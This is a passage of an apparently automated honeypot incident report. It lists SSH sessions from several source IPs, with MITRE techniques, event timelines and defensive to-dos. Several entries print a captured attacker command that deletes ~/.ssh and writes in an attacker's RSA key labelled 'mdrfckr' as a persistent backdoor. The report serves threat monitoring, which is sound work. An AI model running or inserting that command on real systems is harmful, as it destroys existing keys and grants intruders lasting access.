| `2026-06-30 04:12:20` | `cowrie.login.success` |
| `2026-06-30 04:12:21` | `cowrie.session.params` |
| `2026-06-30 04:12:21` | `cowrie.command.input` |
| `2026-06-30 04:12:21` | `cowrie.command.failed` |
| `2026-06-30 04:12:21` | `cowrie.log.closed` |
| `2026-06-30 04:12:22` | `cowrie.session.params` |
| `2026-06-30 04:12:22` | `cowrie.command.input` |
| `2026-06-30 04:12:22` | `cowrie.session.file_download` |
| `2026-06-30 04:12:22` | `cowrie.log.closed` |
| `2026-06-30 04:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.233.48[.]169` to AbuseIPDB if not already reported
- [ ] Block `193.233.48[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eca574ffee01

| Field | Detail |
|---|---|
| **Source IP** | `193.233.48[.]169` |
| **First Seen** | 2026-06-30 04:12 |
| **Last Seen** | 2026-06-30 04:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:12:22` | `cowrie.session.connect` |
| `2026-06-30 04:12:22` | `cowrie.client.version` |
| `2026-06-30 04:12:22` | `cowrie.client.kex` |
| `2026-06-30 04:12:23` | `cowrie.login.success` |
| `2026-06-30 04:12:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.233.48[.]169` to AbuseIPDB if not already reported
- [ ] Block `193.233.48[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eed017dc770f

| Field | Detail |
|---|---|
| **Source IP** | `193.233.48[.]169` |
| **First Seen** | 2026-06-30 04:12 |
| **Last Seen** | 2026-06-30 04:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:12:23` | `cowrie.session.connect` |
| `2026-06-30 04:12:23` | `cowrie.client.version` |
| `2026-06-30 04:12:23` | `cowrie.client.kex` |
| `2026-06-30 04:12:24` | `cowrie.login.success` |
| `2026-06-30 04:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.233.48[.]169` to AbuseIPDB if not already reported
- [ ] Block `193.233.48[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1067ea507f9f

| Field | Detail |
|---|---|
| **Source IP** | `173.244.60[.]241` |
| **First Seen** | 2026-06-30 04:12 |
| **Last Seen** | 2026-06-30 04:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:12:51` | `cowrie.session.connect` |
| `2026-06-30 04:12:51` | `cowrie.client.version` |
| `2026-06-30 04:12:51` | `cowrie.client.kex` |
| `2026-06-30 04:12:51` | `cowrie.login.success` |
| `2026-06-30 04:12:52` | `cowrie.session.params` |
| `2026-06-30 04:12:52` | `cowrie.command.input` |
| `2026-06-30 04:12:52` | `cowrie.command.failed` |
| `2026-06-30 04:12:52` | `cowrie.log.closed` |
| `2026-06-30 04:12:53` | `cowrie.session.params` |
| `2026-06-30 04:12:53` | `cowrie.command.input` |
| `2026-06-30 04:12:53` | `cowrie.session.file_download` |
| `2026-06-30 04:12:53` | `cowrie.log.closed` |
| `2026-06-30 04:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.244.60[.]241` to AbuseIPDB if not already reported
- [ ] Block `173.244.60[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ed77d293bdf

| Field | Detail |
|---|---|
| **Source IP** | `173.244.60[.]241` |
| **First Seen** | 2026-06-30 04:12 |
| **Last Seen** | 2026-06-30 04:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:12:53` | `cowrie.session.connect` |
| `2026-06-30 04:12:53` | `cowrie.client.version` |
| `2026-06-30 04:12:53` | `cowrie.client.kex` |
| `2026-06-30 04:12:53` | `cowrie.login.success` |
| `2026-06-30 04:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.244.60[.]241` to AbuseIPDB if not already reported
- [ ] Block `173.244.60[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91e02ce24ab9

| Field | Detail |
|---|---|
| **Source IP** | `173.244.60[.]241` |
| **First Seen** | 2026-06-30 04:12 |
| **Last Seen** | 2026-06-30 04:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:12:53` | `cowrie.session.connect` |
| `2026-06-30 04:12:53` | `cowrie.client.version` |
| `2026-06-30 04:12:53` | `cowrie.client.kex` |
| `2026-06-30 04:12:53` | `cowrie.login.success` |
| `2026-06-30 04:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.244.60[.]241` to AbuseIPDB if not already reported
- [ ] Block `173.244.60[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce38b2edc5ba

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-06-30 04:13 |
| **Last Seen** | 2026-06-30 04:13 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which htop` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:13:05` | `cowrie.session.connect` |
| `2026-06-30 04:13:09` | `cowrie.client.version` |
| `2026-06-30 04:13:09` | `cowrie.client.kex` |
| `2026-06-30 04:13:23` | `cowrie.login.success` |
| `2026-06-30 04:13:31` | `cowrie.session.params` |
| `2026-06-30 04:13:31` | `cowrie.command.input` |
| `2026-06-30 04:13:35` | `cowrie.log.closed` |
| `2026-06-30 04:13:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-142bb634a091

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-30 04:13 |
| **Last Seen** | 2026-06-30 04:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:13:12` | `cowrie.session.connect` |
| `2026-06-30 04:13:12` | `cowrie.client.version` |
| `2026-06-30 04:13:12` | `cowrie.client.kex` |
| `2026-06-30 04:13:13` | `cowrie.login.success` |
| `2026-06-30 04:13:14` | `cowrie.session.params` |
| `2026-06-30 04:13:14` | `cowrie.command.input` |
| `2026-06-30 04:13:14` | `cowrie.command.failed` |
| `2026-06-30 04:13:14` | `cowrie.log.closed` |
| `2026-06-30 04:13:15` | `cowrie.session.params` |
| `2026-06-30 04:13:15` | `cowrie.command.input` |
| `2026-06-30 04:13:15` | `cowrie.session.file_download` |
| `2026-06-30 04:13:15` | `cowrie.log.closed` |
| `2026-06-30 04:13:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38dc7e357e68

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-30 04:13 |
| **Last Seen** | 2026-06-30 04:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:13:15` | `cowrie.session.connect` |
| `2026-06-30 04:13:15` | `cowrie.client.version` |
| `2026-06-30 04:13:15` | `cowrie.client.kex` |
| `2026-06-30 04:13:16` | `cowrie.login.success` |
| `2026-06-30 04:13:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bb56618416c

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-30 04:13 |
| **Last Seen** | 2026-06-30 04:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:13:16` | `cowrie.session.connect` |
| `2026-06-30 04:13:16` | `cowrie.client.version` |
| `2026-06-30 04:13:16` | `cowrie.client.kex` |
| `2026-06-30 04:13:16` | `cowrie.login.success` |
| `2026-06-30 04:13:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67f6d6c58ed4

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-06-30 04:13 |
| **Last Seen** | 2026-06-30 04:14 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which htop` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:13:50` | `cowrie.session.connect` |
| `2026-06-30 04:13:53` | `cowrie.client.version` |
| `2026-06-30 04:13:53` | `cowrie.client.kex` |
| `2026-06-30 04:14:07` | `cowrie.login.success` |
| `2026-06-30 04:14:14` | `cowrie.session.params` |
| `2026-06-30 04:14:14` | `cowrie.command.input` |
| `2026-06-30 04:14:18` | `cowrie.log.closed` |
| `2026-06-30 04:14:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bc0ea2af25c

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-06-30 04:14 |
| **Last Seen** | 2026-06-30 04:15 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which htop` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:14:33` | `cowrie.session.connect` |
| `2026-06-30 04:14:36` | `cowrie.client.version` |
| `2026-06-30 04:14:36` | `cowrie.client.kex` |
| `2026-06-30 04:14:50` | `cowrie.login.success` |
| `2026-06-30 04:14:58` | `cowrie.session.params` |
| `2026-06-30 04:14:58` | `cowrie.command.input` |
| `2026-06-30 04:15:02` | `cowrie.log.closed` |
| `2026-06-30 04:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3773948cf61

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-06-30 04:15 |
| **Last Seen** | 2026-06-30 04:15 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which htop` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:15:08` | `cowrie.session.connect` |
| `2026-06-30 04:15:12` | `cowrie.client.version` |
| `2026-06-30 04:15:12` | `cowrie.client.kex` |
| `2026-06-30 04:15:25` | `cowrie.login.success` |
| `2026-06-30 04:15:34` | `cowrie.session.params` |
| `2026-06-30 04:15:34` | `cowrie.command.input` |
| `2026-06-30 04:15:37` | `cowrie.log.closed` |
| `2026-06-30 04:15:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecc875b3753c

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-06-30 04:15 |
| **Last Seen** | 2026-06-30 04:16 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which htop` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:15:59` | `cowrie.session.connect` |
| `2026-06-30 04:16:01` | `cowrie.client.version` |
| `2026-06-30 04:16:01` | `cowrie.client.kex` |
| `2026-06-30 04:16:16` | `cowrie.login.success` |
| `2026-06-30 04:16:23` | `cowrie.session.params` |
| `2026-06-30 04:16:23` | `cowrie.command.input` |
| `2026-06-30 04:16:26` | `cowrie.log.closed` |
| `2026-06-30 04:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4abda90b8af5

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-06-30 04:17 |
| **Last Seen** | 2026-06-30 04:17 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which htop` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:17:19` | `cowrie.session.connect` |
| `2026-06-30 04:17:22` | `cowrie.client.version` |
| `2026-06-30 04:17:22` | `cowrie.client.kex` |
| `2026-06-30 04:17:35` | `cowrie.login.success` |
| `2026-06-30 04:17:43` | `cowrie.session.params` |
| `2026-06-30 04:17:43` | `cowrie.command.input` |
| `2026-06-30 04:17:46` | `cowrie.log.closed` |
| `2026-06-30 04:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aebe5a9c4ba

| Field | Detail |
|---|---|
| **Source IP** | `14.103.120[.]130` |
| **First Seen** | 2026-06-30 04:18 |
| **Last Seen** | 2026-06-30 04:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:18:05` | `cowrie.session.connect` |
| `2026-06-30 04:18:05` | `cowrie.client.version` |
| `2026-06-30 04:18:05` | `cowrie.client.kex` |
| `2026-06-30 04:18:06` | `cowrie.login.success` |
| `2026-06-30 04:18:07` | `cowrie.session.params` |
| `2026-06-30 04:18:07` | `cowrie.command.input` |
| `2026-06-30 04:18:07` | `cowrie.command.failed` |
| `2026-06-30 04:18:08` | `cowrie.log.closed` |
| `2026-06-30 04:18:08` | `cowrie.session.params` |
| `2026-06-30 04:18:08` | `cowrie.command.input` |
| `2026-06-30 04:18:09` | `cowrie.session.file_download` |
| `2026-06-30 04:18:09` | `cowrie.log.closed` |
| `2026-06-30 04:18:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.120[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.120[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4ff9af8b869

| Field | Detail |
|---|---|
| **Source IP** | `14.103.120[.]130` |
| **First Seen** | 2026-06-30 04:18 |
| **Last Seen** | 2026-06-30 04:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:18:09` | `cowrie.session.connect` |
| `2026-06-30 04:18:09` | `cowrie.client.version` |
| `2026-06-30 04:18:09` | `cowrie.client.kex` |
| `2026-06-30 04:18:10` | `cowrie.login.success` |
| `2026-06-30 04:18:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.120[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.120[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c77c233565a9

| Field | Detail |
|---|---|
| **Source IP** | `14.103.120[.]130` |
| **First Seen** | 2026-06-30 04:18 |
| **Last Seen** | 2026-06-30 04:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:18:10` | `cowrie.session.connect` |
| `2026-06-30 04:18:10` | `cowrie.client.version` |
| `2026-06-30 04:18:11` | `cowrie.client.kex` |
| `2026-06-30 04:18:12` | `cowrie.login.success` |
| `2026-06-30 04:18:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.120[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.120[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d94d1003aaa

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-06-30 04:19 |
| **Last Seen** | 2026-06-30 04:19 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which htop` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:19:14` | `cowrie.session.connect` |
| `2026-06-30 04:19:18` | `cowrie.client.version` |
| `2026-06-30 04:19:18` | `cowrie.client.kex` |
| `2026-06-30 04:19:38` | `cowrie.login.success` |
| `2026-06-30 04:19:46` | `cowrie.session.params` |
| `2026-06-30 04:19:46` | `cowrie.command.input` |
| `2026-06-30 04:19:49` | `cowrie.log.closed` |
| `2026-06-30 04:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-852df017f7c4

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 04:20 |
| **Last Seen** | 2026-06-30 04:20 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:20:18` | `cowrie.session.connect` |
| `2026-06-30 04:20:19` | `cowrie.client.version` |
| `2026-06-30 04:20:19` | `cowrie.client.kex` |
| `2026-06-30 04:20:25` | `cowrie.login.success` |
| `2026-06-30 04:20:28` | `cowrie.session.params` |
| `2026-06-30 04:20:28` | `cowrie.command.input` |
| `2026-06-30 04:20:30` | `cowrie.log.closed` |
| `2026-06-30 04:20:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b045c416814

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-06-30 04:21 |
| **Last Seen** | 2026-06-30 04:21 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which htop` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:21:04` | `cowrie.session.connect` |
| `2026-06-30 04:21:08` | `cowrie.client.version` |
| `2026-06-30 04:21:08` | `cowrie.client.kex` |
| `2026-06-30 04:21:21` | `cowrie.login.success` |
| `2026-06-30 04:21:29` | `cowrie.session.params` |
| `2026-06-30 04:21:29` | `cowrie.command.input` |
| `2026-06-30 04:21:32` | `cowrie.log.closed` |
| `2026-06-30 04:21:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bcc62c52b44

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-06-30 04:22 |
| **Last Seen** | 2026-06-30 04:22 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which htop` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:22:25` | `cowrie.session.connect` |
| `2026-06-30 04:22:28` | `cowrie.client.version` |
| `2026-06-30 04:22:28` | `cowrie.client.kex` |
| `2026-06-30 04:22:42` | `cowrie.login.success` |
| `2026-06-30 04:22:55` | `cowrie.session.params` |
| `2026-06-30 04:22:55` | `cowrie.command.input` |
| `2026-06-30 04:22:58` | `cowrie.log.closed` |
| `2026-06-30 04:22:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc64d324d709

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 04:25 |
| **Last Seen** | 2026-06-30 04:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:25:24` | `cowrie.session.connect` |
| `2026-06-30 04:25:24` | `cowrie.client.version` |
| `2026-06-30 04:25:24` | `cowrie.client.kex` |
| `2026-06-30 04:25:27` | `cowrie.login.success` |
| `2026-06-30 04:25:28` | `cowrie.session.params` |
| `2026-06-30 04:25:28` | `cowrie.command.input` |
| `2026-06-30 04:25:29` | `cowrie.log.closed` |
| `2026-06-30 04:25:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbf76d69da47

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 04:32 |
| **Last Seen** | 2026-06-30 04:32 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:32:35` | `cowrie.session.connect` |
| `2026-06-30 04:32:36` | `cowrie.client.version` |
| `2026-06-30 04:32:36` | `cowrie.client.kex` |
| `2026-06-30 04:32:42` | `cowrie.login.success` |
| `2026-06-30 04:32:46` | `cowrie.session.params` |
| `2026-06-30 04:32:46` | `cowrie.command.input` |
| `2026-06-30 04:32:47` | `cowrie.log.closed` |
| `2026-06-30 04:32:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7ec73c45d50

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 04:40 |
